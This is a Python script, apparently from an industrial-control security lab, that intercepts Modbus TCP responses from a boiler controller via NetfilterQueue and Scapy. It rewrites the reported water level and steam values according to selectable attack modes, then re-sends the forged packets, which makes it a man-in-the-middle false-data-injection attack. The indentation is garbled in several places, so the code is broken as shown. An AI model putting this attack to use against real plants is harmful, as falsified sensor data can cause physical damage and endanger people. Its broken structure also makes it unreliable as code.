import random
import NetworkEncoder as ne
from netfilterqueue import NetfilterQueue
from pymodbus.client.sync import ModbusTcpClient
from scapy.all import *

MODBUS_SLAVE = 'ms.ics.example.com'

random.seed(100)
response = ''

# convert string to hex
def toHex(s):
    lst = []
    for ch in s:
        hv = hex(ord(ch)).replace('0x', '')
        if len(hv) == 1:
            hv = '0' + hv
        lst.append(hv)
    
    return reduce(lambda x, y: x + y, lst)

def plx(x):
    val = int(x, 16)
    return chr(val)

def runAttack(response, pkt):
    sc_pkt = IP(pkt.get_payload())
    ip_hex = toHex(str(sc_pkt))
    
    if sc_pkt[IP].src == MODBUS_SLAVE and sc_pkt[TCP].sport == 502 and ip_hex[118:120] == '03' and ip_hex[120:122] == '2a':
        
        registers = []
        for i in range(0, 21):
            index = 122 + (4 * i)
            registers.append(int(ip_hex[index:index + 4], 16))
    
        addWater = ne.modbusDecode(0, 2, 2, registers)
        addFire = ne.modbusDecode(2, 2, 0, registers)
        waterLevel = ne.modbusDecode(3, 4, 4, registers)
        waterTemp = ne.modbusDecode(7, 2, 2, registers)
        powerOut = ne.modbusDecode(9, 6, 2, registers)
        steamStep = ne.modbusDecode(13, 2, 4, registers)
        powerIn = ne.modbusDecode(16, 6, 2, registers)
        serverSeconds = ne.modbusDecode(20, 2, 0, registers)
        
        if response == '1':
            #10,000L below optimal level
            waterLevel = 500000 - 10000
            steamStep *= 1.5
if response == '2':
    #1,000L below optimal level
    waterLevel = 500000 - 1000
        if response == '3':
            # Constantly 1,500L below optimum level +- 15%
            waterLevel = 500000 - (1500 * (random.randint(85, 115) / 100))
    if response == '4':
        # Constantly 1,500L below optimum level +- 15% + last add of water from master
        waterLevel = 500000 - (1500 * (random.randint(85, 115) / 100)) + addWater
        
        outputs = []
        outputs = ne.modbusEncode(addWater, 2, 2, outputs)
        outputs = ne.modbusEncode(addFire, 2, 0, outputs)
        outputs = ne.modbusEncode(waterLevel, 4, 4, outputs)
        outputs = ne.modbusEncode(waterTemp, 2, 2, outputs)
        outputs = ne.modbusEncode(powerOut, 6, 2, outputs)
        outputs = ne.modbusEncode(steamStep, 2, 4, outputs)
        outputs = ne.modbusEncode(powerIn, 6, 2, outputs)
        outputs = ne.modbusEncode(serverSeconds, 2, 0, outputs)
        
        print(outputs)
        
        payload = ""
        
        for reg in outputs:
            add = str(hex(reg))[2:]
            for x in range(len(add), 4):
                add = '0' + str(add)
            payload += plx(add[0:2]) + plx(add[2:4])

        sc_pkt[Raw].load = sc_pkt[Raw].load[0:9] + payload

del sc_pkt[IP].chksum
del sc_pkt[TCP].chksum
#print(sc_pkt.show2())
send(sc_pkt)
    pkt.drop()
    else:
        pkt.accept()

def mitm(pkt):
    f = open("RIAttackMode.txt")
    mode = f.readline()
    print "[" + mode + "]"
    
    if mode != 'n':
        runAttack(mode, pkt)
    else:
        print(len(pkt.get_payload()))
        pkt.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(1, mitm)

try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()
